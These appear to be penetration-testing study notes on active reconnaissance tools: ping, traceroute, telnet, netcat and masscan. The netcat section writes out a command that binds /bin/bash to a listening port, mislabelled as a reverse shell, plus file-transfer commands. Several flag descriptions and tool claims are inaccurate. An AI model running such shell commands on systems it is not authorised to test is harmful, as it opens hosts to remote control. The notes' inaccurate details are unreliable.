#### What is it ?
Active reconnaissance in penetration testing involves <mark style="background: #FF5582A6;">direct interaction</mark> with the target system or network to gather information, identify potential vulnerabilities, and assess the security posture. The following are some techniques and associated tools used in active reconnaissance:

1. <mark style="background: #FF5582A6;">Port Scanning</mark>: Tools like Nmap, Masscan, or Nessus can be used to scan target IP addresses and ports to determine open, closed, or filtered ports.

3. <mark style="background: #FF5582A6;">Service Identification</mark>: Once open ports are discovered, tools like Nmap, Netcat, or Bannergrab can be used to identify the services running on those ports.

4. <mark style="background: #FF5582A6;">Banner Grabbing</mark>: Tools like Netcat, Telnet, or Bannergrab can extract information from service banners or headers to gather details about software versions or configurations.

5. <mark style="background: #FF5582A6;">OS Fingerprinting</mark>: Tools like Nmap, p0f, or Xprobe2 can be used to identify the operating system running on the target system by analyzing network responses or packet timings.

6. <mark style="background: #FF5582A6;">Vulnerability Scanning</mark>: Tools like Nessus, OpenVAS, or Qualys can scan the target system or network for known vulnerabilities associated with the OS, services, or applications.

7. <mark style="background: #FF5582A6;">Active Probing</mark>: Tools like Hping, Burp Suite, or Metasploit Framework can be used for active probing by sending crafted packets or requests to gather specific information about the target system's configuration, network infrastructure, or potential vulnerabilities. 

### Ping

<mark style="background: #BBFABBA6;">Ping is a computer network utility that is used to test the reachability of a host on an IP network</mark>. It operates by sending Internet Control Message Protocol <mark style="background: #BBFABBA6;">(ICMP) echo request packets</mark> to the destination host and waiting for <mark style="background: #BBFABBA6;">ICMP echo reply packets</mark>. The time it takes for the echo reply packet to return is called <mark style="background: #BBFABBA6;">the round-trip time (RTT)</mark>.

The ping command can be used to troubleshoot network problems, such as packet loss or high latency. It can also be used to verify that a host is online and reachable.

The syntax for the ping command is as follows:

```bash
ping [options] <destination>
```

Where:

- `<destination>` is the IP address or hostname of the host to ping.
- `-t` Continuously ping destination until interrupted
- `-a` Resolve addresses to hostnames
- `-n` Number of echo requests to send
- `-l` Size of echo request in bytes
- `-f` Set Don't Fragment flag in packet
- `-i` Time to live
- `-v` Verbose output
- `-w` Timeout in milliseconds to wait for each reply

When we don’t get a ping reply back, It is possible that:

- <mark style="background: #FF5582A6;">The destination computer is not responsive; possibly still booting up or turned off, or the OS has crashed.</mark>
- <mark style="background: #FF5582A6;">It is unplugged from the network, or there is a faulty network device across the path.</mark>
- <mark style="background: #FF5582A6;">A firewall is configured to block such packets. The firewall might be running on the system itself or a separate network appliance. MS Windows firewall blocks ping by default.</mark>
- <mark style="background: #FF5582A6;">Our system is unplugged from the network.</mark>

### Traceroute

<mark style="background: #FF5582A6;">Traceroute is a network utility that is used to trace the route that packets take from a source host to a destination host</mark>. It operates by sending Internet Control Message Protocol (ICMP) echo request packets to the destination host with increasing time to live (TTL) values. <mark style="background: #BBFABBA6;">Each router that the packets pass through decrements the TTL value by one</mark>. When the TTL value reaches zero, the router sends an ICMP time exceeded message back to the source host. <mark style="background: #BBFABBA6;">The source host then uses the information in the ICMP time exceeded messages to construct a list of the routers that the packets passed through</mark>.

The syntax for the traceroute command is as follows:

```bash
traceroute [options] <destination>
```

Where:

- `<destination>` is the IP address or hostname of the destination host.
- `-n` Numeric output (no hostnames)
- `-q` Quiet output (no timestamps)
- `-v` Verbose output (show more information)
- `-w` Timeout in seconds to wait for each reply

### Telnet

Telnet is a network protocol that allows a user to communicate with a remote computer. It is a text-based protocol that uses <mark style="background: #FF5582A6;">the Transmission Control Protocol (TCP) to establish a connection between the two computers</mark>. Telnet is often used to troubleshoot network problems, test network services, and access remote computers by hitting specific ports, <mark style="background: #BBFABBA6;">the default port for telnet is 23</mark>.

The syntax for the telnet command is as follows:

```bash
telnet <hostname> <port>
```

Where:

- `<hostname>` is the IP address or hostname of the remote computer.
- `<port>` is the port number of the service that you want to access.

### Netcat

 <mark style="background: #FF5582A6;">Netcat is a versatile tool that can be used for a variety of networking tasks, including port scanning, transferring files, and creating reverse shells</mark>.

In the context of penetration testing, Netcat can be used to:

* <mark style="background: #BBFABBA6;">Scan ports on a target system to identify open ports and services</mark>.
* <mark style="background: #BBFABBA6;">Transfer files between a local system and a remote system</mark>.
* <mark style="background: #BBFABBA6;">Create a reverse shell on a remote system, which can then be used to execute commands and control the system</mark>.

|option|meaning|
|---|---|
|-l|Listen mode|
|-p|Specify the Port number|
|-n|Numeric only; no resolution of hostnames via DNS|
|-v|Verbose output (optional, yet useful to discover any bugs)|
|-vv|Very Verbose (optional)|
|-k|Keep listening after client disconnects|

Notes:

- the option `-p` should appear just before the port number we want to listen on.
- the option `-n` will avoid DNS lookups and warnings.
- port numbers less than 1024 require root privileges to listen on.

The syntax to connect to a remote system using Netcat:

```bash
nc <remote_IP_address> <remote_port>
```

To use Netcat for port scanning, we can use the following command:

```bash
nc -v -n -z <target IP> <port range>
```

For example, to scan ports 1-100 on the target IP address 192.168.1.1, we would use the following command:

```bash
nc -v -n -z 192.168.1.1 1-100
```

To transfer a file from a local system to a remote system, we can use the following command:

```bash
nc -v -n <remote IP> <port> < <local file>
```

For example, to transfer the file `file.txt` from the local system to the remote system at IP address 192.168.1.1 on port 80, we would use the following command:

```bash
nc -v -n 192.168.1.1 80 < file.txt
```

To create a reverse shell on a remote system, we can use the following command:

```bash
nc -v -n -l -p <local port> -e /bin/bash
```

For example, to create a reverse shell on the local system on port 4444, you would use the following command:

```bash
nc -v -n -l -p 4444 -e /bin/bash
```

### Masscan

<mark style="background: #FF5582A6;">Masscan is a high-speed network scanner that can scan large networks in a short amount of time</mark>. It is designed to be used for penetration testing and security auditing. Masscan can scan for open ports, operating systems, and web applications. It can also be used to identify vulnerabilities and exploits.

Here are some examples of how Masscan can be used:

Scan a single IP address for open ports:

```bash
masscan @IP
```

Scan a single IP address for open ports, with verbose output:

```bash
masscan @IP -v
```

Scan a network for open ports and web applications, with a list of specific ports:

```bash
masscan -p80,443,8080 -Pn @IP/24
```